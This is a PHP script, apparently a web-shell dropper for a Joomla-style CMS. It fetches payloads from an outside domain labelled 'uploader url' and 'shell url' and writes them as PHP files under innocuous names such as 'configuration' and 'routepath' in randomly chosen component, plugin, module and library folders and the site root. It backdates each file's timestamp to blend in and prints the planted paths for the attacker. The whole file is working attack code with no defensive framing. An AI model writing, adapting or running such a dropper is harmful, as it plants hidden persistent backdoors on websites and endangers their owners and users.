<?php

function first_file_date($path){
	$scan = scandir($path);

	foreach ($scan as $dir) {
		if ($dir == '.' || $dir == '..') continue;

		if (is_dir($path.'/'.$dir)) {
			$time = filemtime($path.'/'.$dir);
			continue;
		}

		return filemtime($path.'/'.$dir);
	}
	return $time;
}

$urls = array(
	'1' => 'http://www.xcsekopcqwcksefhnseiocawgrdhdrawd.net/l/o/l/0.txt', // uploader url
	'2' => 'http://www.xcsekopcqwcksefhnseiocawgrdhdrawd.net/l/o/l/0.txt', // shell url
	);

$filenames = array( 'configuration', 'pagenews', 'contacts', 'redirecter', 'languager', 'userloader', 'controll' , 'routepath', 'viewme');
$folders = array( 'components', 'plugins', 'modules', 'libraries' );

$root_dir = dirname(dirname(__DIR__));
$paths = array();
foreach ($folders as $folder) {
	$subfolders = scandir($root_dir.'/'.$folder);
	
	foreach ($subfolders as $k => $dir) {
		if ($dir == '.' || $dir == '..') unset($subfolders[$k]);

		if (!is_dir($root_dir.'/'.$folder.'/'.$dir)) unset($subfolders[$k]);

	}

	$p = array_rand($subfolders, 2);

	for ($i=0; $i < 2; $i++) { 
		$path = $root_dir.'/'.$folder.'/'.$subfolders[$p[$i]].'/';

		do {
			$f = array_rand($filenames);
		} while ( is_file($path.$filenames[$f].'.php') );

		$used_names[] = $f;

		$paths[] = $path.$filenames[$f].'.php';

	}
}


$m = array_rand($paths);
if ( is_writable( dirname($paths[$m]) ) ) {
	$f = fopen($paths[$m], 'w+');
	fwrite($f, file_get_contents($urls[1]) );
	touch( $paths[$m], first_file_date( dirname($paths[$m]) ) );
	$success['uniqe'] = $paths[$m];
	unset($paths[$m]);
}

foreach ($paths as $k => $path) {
	if ( is_writable( dirname($path) ) ) {
		$f = fopen($path, 'w+');
		fwrite($f, file_get_contents($urls[2]) );
		touch( $path, first_file_date( dirname($path) ) );
		$success[$k] = $path;
	}
	//break;
}

do {
	$m = array_rand($filenames);
} while ( is_file($root_dir.'/'.$filenames[$m].'.php') );
$path = $root_dir.'/'.$filenames[$m].'.php';
if ( is_writable( dirname($path) ) ) {
	$f = fopen($path, 'w+');
	fwrite($f, file_get_contents($urls[2]) );
	touch( $path, first_file_date( dirname($path) ) );
	$success['main'] = $path;
}

foreach ($success as $k => $v) {
	$success[$k] = str_replace( $root_dir, '', $v);

	print '[sh1]'.$success[$k].'[/sh1]';
}

// $c= file_put_contents($b."/configuration-backup.php",$a);
?>